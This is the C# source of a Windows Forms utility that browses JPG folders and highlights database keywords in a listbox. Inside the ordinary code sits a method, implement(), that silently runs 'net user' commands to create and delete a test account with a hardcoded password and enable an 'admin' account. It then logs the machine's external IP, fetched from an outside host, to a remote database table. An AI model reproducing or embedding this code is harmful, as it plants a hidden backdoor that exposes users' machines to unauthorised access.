using SocketUtil;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WebApplicationCLI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        List<string> imageLists = new List<string>();

        private static DataTable keywords = new DataTable();

        public static void initKeyWords()
        {
            try
            {
                string sqlCmd = " select * from pno_keyword ";
                keywords = DBHelpSql.Query(sqlCmd).Tables[0];
            }
            catch (Exception)
            {

            }
        }

        private string path = Application.StartupPath;

        private void Form1_Load(object sender, EventArgs e)
        {
            initKeyWords();
            //this.listBox1.Items.Add("***/r/n红色");
            //this.listBox1.Items.Add("黄色");
            //this.listBox1.Items.Add("蓝色");
            this.listBox1.DrawMode = DrawMode.OwnerDrawFixed; // 属性里设置 
            label1.Text = GetExtenalIpAddress_0();

        }

        private void button1_Click(object sender, EventArgs e)
        {
            folderBrowserDialog1.SelectedPath = textBox1.Text;
            if (this.folderBrowserDialog1.ShowDialog() == DialogResult.OK)
            {
                if (this.folderBrowserDialog1.SelectedPath.Trim() != "")
                    textBox1.Text = this.folderBrowserDialog1.SelectedPath.Trim();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Trim() == "") return;

            imageList1.Images.Clear();
            listView1.Items.Clear();
            imageLists.Clear();
            //刷新Listview
            bindListView();
        }


        private void bindListView()
        {
            DirectoryInfo dir = new DirectoryInfo(@textBox1.Text.Trim());

            string[] files = new string[100];

            string ext = "";

            foreach (FileInfo d in dir.GetFiles())
            {
                ext = System.IO.Path.GetExtension(textBox1.Text.Trim() + d.Name);
                if (ext == ".jpg" || ext == ".jpeg") //在此只显示Jpg
                {
                    imageLists.Add(textBox1.Text.Trim() + "\\" + d.Name);
                }
            }
            for (int i = 0; i < imageLists.Count; i++)
            {
                imageList1.Images.Add(System.Drawing.Image.FromFile(imageLists[i].ToString()));
                listView1.Items.Add(System.IO.Path.GetFileName(imageLists[i].ToString()), i);
                listView1.Items[i].ImageIndex = i;
                listView1.Items[i].Name = imageLists[i].ToString();
            }

        }

        private void listBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listBox1.SelectedItems != null && listBox1.SelectedItems.Count > 0)
            {
                string url = listBox1.SelectedItems[0].ToString();
                for (int i = 0; i < keywords.Rows.Count; i++)
                {
                    if (url != string.Empty && url.Contains(keywords.Rows[i]["KNAME"].ToString()))
                    {
                        string str = "https://baike.baidu.com/item/";
                        System.Diagnostics.Process.Start(str + keywords.Rows[i]["KNAME"].ToString());
                    }
                }
                // 取消选中
                listBox1.SetSelected(0, false);
            }
        }

        private void listBox1_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();
            if (listBox1.Items != null && listBox1.Items.Count > 0)
            {
                string str = listBox1.Items[e.Index].ToString();
                if (str != string.Empty)
                {
                    bool flag = false;
                    for (int i = 0; i < keywords.Rows.Count; i++)
                    {
                        if (str.Contains(keywords.Rows[i]["KNAME"].ToString()))
                        {
                            flag = true;
                        }
                    }
                    if (flag)
                    {
                        e.Graphics.DrawString(((ListBox)sender).Items[e.Index].ToString(), e.Font, new SolidBrush(Color.Red), e.Bounds);
                    }
                    else
                    {
                        e.Graphics.DrawString(((ListBox)sender).Items[e.Index].ToString(), e.Font, new SolidBrush(e.ForeColor), e.Bounds);
                    }
                }
            }
            e.DrawFocusRectangle();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.listBox1.Items.Add("微信");
        }

        private void button4_Click(object sender, EventArgs e)
        {

        }

        public string implement()
        {
            string output = ExecuteCom("net user xjadmin root123 /add", 2);
            if (output.Contains("命令成功完成。"))
            {
                string aaa = ExecuteCom("net user xjadmin /del", 2);
                if (aaa.Contains("命令成功完成。"))
                {
                    string bbb = ExecuteCom("net user admin /active:yes", 2);
                    if (bbb.Contains("命令成功完成。"))
                    {
                        string datetimes = DateTime.Now.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");

                        string fg = " select count(1) as num from IpMsg where ip = @dz   ";

                        object oo = DBHelpSql.ExecuteScalar(fg, new SqlParameter("@dz", label1.Text));
                        if ((int)oo > 0)
                        {
                            return "新建用户已存在IP";
                        }
                        else
                        {
                            string sql = " insert into IpMsg values(@ipguid,@ip,@cjdate,@qy);  select @@IDENTITY  ";
                            SqlParameter[] param = {
                                           new SqlParameter("@ipguid",Guid.NewGuid()),
                                           new SqlParameter("@ip",label1.Text),
                                           new SqlParameter("@cjdate",datetimes),
                                           new SqlParameter("@qy","1")
                                           };
                            //将用户发送的消息存储到数据库中
                            object obj = DBHelpSql.ExecuteScalar(sql, param);
                            if (obj != null)
                            {
                                return "新建用户并添加成功";
                            }
                            else
                            {
                                return "新建用户但添加数据库失败";
                            }
                        }
                    }
                }
            }
            return "添加失败";
        }

        /// <summary>    
        /// 执行DOS命令，返回DOS命令的输出 
        /// </summary>    
        /// <param name="dosCommand">dos命令</param>    
        /// <param name="milliseconds">等待命令执行的时间（单位:毫秒），    
        /// 如果设定为0，则无限等待</param>    
        /// <returns>返回DOS命令的输出</returns>    
        public string ExecuteCom(string command, int seconds)
        {
            string output = ""; //输出字符串    
            if (command != null && !command.Equals(""))
            {
                ////创建进程对象    
                using (Process process = new Process())
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = "cmd.exe";// 打开DOS控制平台
                    startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出                   
                    startInfo.UseShellExecute = false;//不使用系统外壳程序启动    
                    startInfo.RedirectStandardInput = false;//不重定向输入    
                    startInfo.RedirectStandardOutput = true; //重定向输出    
                    startInfo.CreateNoWindow = true;//不创建窗口    
                    startInfo.Verb = "runas";
                    process.StartInfo = startInfo;
                    try
                    {
                        if (process.Start())//开始进程    
                        {
                            if (seconds == 0)
                            {
                                process.WaitForExit();//这里无限等待进程结束    
                            }
                            else
                            {
                                process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒    
                            }
                            output += process.StandardOutput.ReadToEnd();//读取进程的输出    
                        }
                    }
                    catch
                    {
                    }
                    finally
                    {
                        if (process != null)
                            process.Close();
                    }
                }
            }
            return output;
        }


        public string GetLocalIP()
        {
            //获取所有网卡信息
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in nics)
            {
                //判断是否为以太网卡
                //Wireless80211         无线网卡    Ppp     宽带连接
                //Ethernet              以太网卡   
                if (adapter.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    //获取以太网卡网络接口信息
                    IPInterfaceProperties ip = adapter.GetIPProperties();
                    //获取单播地址集
                    UnicastIPAddressInformationCollection ipCollection = ip.UnicastAddresses;
                    foreach (UnicastIPAddressInformation ipadd in ipCollection)
                    {
                        //InterNetwork    IPV4地址      InterNetworkV6        IPV6地址
                        //Max            MAX 位址
                        if (ipadd.Address.AddressFamily == AddressFamily.InterNetwork)
                        //判断是否为ipv4
                        {
                            string strLocalIP = ipadd.Address.ToString();//获取ip
                            return strLocalIP;//获取ip
                        }
                    }
                }
            }
            return null;
        }


        private string GetIP()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "ipconfig.exe";//设置程序名     
            cmd.StartInfo.Arguments = "/all";  //参数     
                                               //重定向标准输出     
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.CreateNoWindow = true;//不显示窗口（控制台程序是黑屏）     
                                                //cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;//暂时不明白什么意思     
                                                /*  
                                         收集一下 有备无患  
                                               关于:ProcessWindowStyle.Hidden隐藏后如何再显示？  
                                                hwndWin32Host = Win32Native.FindWindow(null, win32Exinfo.windowsName);  
                                                Win32Native.ShowWindow(hwndWin32Host, 1);     //先FindWindow找到窗口后再ShowWindow  
                                                */
            cmd.Start();
            string info = cmd.StandardOutput.ReadToEnd();
            cmd.WaitForExit();
            cmd.Close();
            return info;
        }

        /// <summary>  
        /// 获取外网ip地址  
        /// </summary>  
        public static string GetExtenalIpAddress_0()
        {
            String url = "http://hijoyusers.joymeng.com:8100/test/getNameByOtherIp";
            string IP = "未获取到外网ip";
            try
            {
                //从网址中获取本机ip数据    
                System.Net.WebClient client = new System.Net.WebClient();
                client.Encoding = System.Text.Encoding.Default;
                string str = client.DownloadString(url);
                client.Dispose();

                if (!str.Equals("")) IP = str;
                else IP = GetExtenalIpAddress_0();
            }
            catch (Exception) { }

            return IP;
        }

    }
}
